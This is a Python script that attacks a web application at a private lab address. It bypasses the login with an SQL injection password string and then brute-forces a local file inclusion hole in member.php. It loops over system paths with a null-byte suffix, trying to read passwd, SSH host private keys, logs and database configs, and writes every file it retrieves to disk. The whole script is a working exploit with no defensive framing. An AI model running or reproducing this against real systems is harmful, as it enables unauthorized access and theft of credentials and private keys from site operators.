import requests
s = requests.session()

appendnull = True
folders = ["/etetcc/", "/var/", "/usr/", "/opt/", "/proc/"]
subfolders = [
		"", 
		"php5/cli/", 
		"php5/apache2/", 
		"php5/cgi/",
		"apache/",
		"apache2/", 
		"apache/logs/", 
		"httpd/logs/",
		"httpd/conf/" 
		"www/logs/",
		"local/apache/logs/" 
		"log/", 
		"log/apache/", 
		"log/apache2/",
		"log/cups/",
		"log/lighttpd/",
		"cups/",
		"lamp/etc/",
		"network/",
		"sysconfig/",
		"lib/",
		"lib/dhcp3/"
		"lib/mysql/",
		"lib/mysql/mysql/",
		"mail/",
		"spool/",
		"spool/mail/",
		"ssh/",
		"run/",
		"webmin/",
		"mysql/"
]
files = [
		"passwd", 
		"php.ini", 
		"access.log", 
		"access_log", 
		"error.log", 
		"error_log",
		"syslog.conf"
		"chttp.conf",
		"lighttpd.conf",
		"cupsd.conf",
		"apache2.conf",
		"inetd.conf",
		"my.conf",
		"httpd.conf",
		"ports.conf",
		"cron*",
		"at.allow",
		"at.deny",
		"cron.allow",
		"cron.deny",
		"crontab",
		"anacrontab",
		"interfaces",
		"network",
		"networks",
		"resolv.conf",
		"services",
		"config.inc",
		"user.MYD",
		"anaconda-ks.cfg",
		"root",
		"ssh_config",
		"sshd_config",
		"ssh_host_dsa_key.pub",
		"ssh_host_dsa_key",
		"ssh_host_rsa_key.pub",
		"ssh_host_rsa_key",
		"ssh_host_key.pub",
		"ssh_host_key",
		"dhclient.leases",
		"auth.log",
		"chttp.log",
		"dpkg.log",
		"faillog",
		"lastlog",
		"lighttpd.access.log",
		"lighttpd.error.log",
		"messages",
		"secure",
		"syslog",
		"wtmp",
		"xferlog",
		"yum.log",
		"miniserv.log",
		"issue",
		"*-release"
		"lsb-release",
		"redhat-release",
		"version",
		"profile",
		"bashrc",
		"my.cnf",
		"debian.cnf"
]
lfi_vulnerable_link = "http://192.168.209.143/member.php?username="
fail_response = "something went wrong with your"

#authentication
r = s.post("http://192.168.209.143/checklogin.php", data={'myusername':'admin', 'mypassword':"' or '1'='1"})

for folder in folders:
	for sub in subfolders:
		for f in files:
			if appendnull == True:
				r = s.get(lfi_vulnerable_link + folder + sub + f + "%00")
			else:
				r = s.get(lfi_vulnerable_link + folder + sub + f)
			if (not fail_response in r.text) and len(r.text) > 1:
				if ("failed to open stream: Permission denied" in r.text):
					print "Access denied: '" + folder + f + "'..."
				else:
					print "'" + folder + sub + f + "' contains something..."
					filename = folder + sub + f
					filename = filename.replace("/", "-")
					file = open(filename, "w")
					file.write(r.text)
					file.close()
